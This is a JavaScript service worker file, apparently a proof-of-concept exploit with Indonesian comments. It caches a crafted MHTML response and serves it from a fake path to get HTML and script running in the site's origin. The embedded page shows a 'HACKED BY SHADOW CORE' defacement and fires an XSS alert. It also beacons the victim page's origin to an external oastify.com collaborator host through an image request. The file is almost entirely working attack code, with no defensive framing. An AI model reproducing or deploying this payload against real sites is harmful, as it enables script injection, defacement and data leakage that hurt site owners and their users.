const MHTML_BOUNDARY = '----MultipartBoundary--SHADOWCORE';
const CACHE_NAME = 'mhtml-cache-v1';

// Inner HTML yang akan dieksekusi
const INNER_HTML = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>HACKED</title></head>
<body style="margin:0;background:#000;color:#0f0;font-family:monospace;text-align:center">
<h1 style="color:#f00;margin-top:40vh">HACKED BY SHADOW CORE</h1>
<p>MHTML Executed via Service Worker!</p>
<p style="font-size:12px">Origin: <span id="o"></span></p>
<script>
document.getElementById('o').textContent = window.location.origin;
try { alert('MHTML via SW XSS'); } catch(e) {}
new Image().src = 'http://ueclik1jyoox9ewpzs6yg1fkmbs2gtjh8.oastify.com/sw-mhtml?origin=' + encodeURIComponent(window.location.origin);
<\/script>
</body>
</html>`;

// Bangun string MHTML lengkap
function buildMHTML() {
  return `From: <Saved by Blink>\r\n` +
    `Snapshot-Content-Location: file:///C:/fake/path.html\r\n` +
    `Subject: Security Alert\r\n` +
    `Date: ${new Date().toUTCString()}\r\n` +
    `MIME-Version: 1.0\r\n` +
    `Content-Type: multipart/related;\r\n` +
    `\ttype="text/html";\r\n` +
    `\tboundary="${MHTML_BOUNDARY}"\r\n` +
    `\r\n` +
    `--${MHTML_BOUNDARY}\r\n` +
    `Content-Type: text/html\r\n` +
    `Content-ID: <frame-1@mhtml.blink>\r\n` +
    `Content-Transfer-Encoding: quoted-printable\r\n` +
    `Content-Location: file:///C:/fake/path.html\r\n` +
    `\r\n` +
    INNER_HTML + `\r\n` +
    `\r\n` +
    `--${MHTML_BOUNDARY}--\r\n`;
}

// Install: cache MHTML
self.addEventListener('install', (event) => {
  self.skipWaiting();
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) => {
      const mhtml = buildMHTML();
      const response = new Response(mhtml, {
        headers: {
          'Content-Type': `multipart/related; type="text/html"; boundary="${MHTML_BOUNDARY}"`,
          'Content-Disposition': 'inline',
          'X-Content-Type-Options': 'nosniff'
        }
      });
      return cache.put('/mhtml-payload', response);
    })
  );
});

// Activate
self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

// Fetch: intersepsi request ke /mhtml-payload
self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('/mhtml-payload')) {
    event.respondWith(
      caches.match('/mhtml-payload').then((response) => {
        return response || new Response('Not found', { status: 404 });
      })
    );
  }
});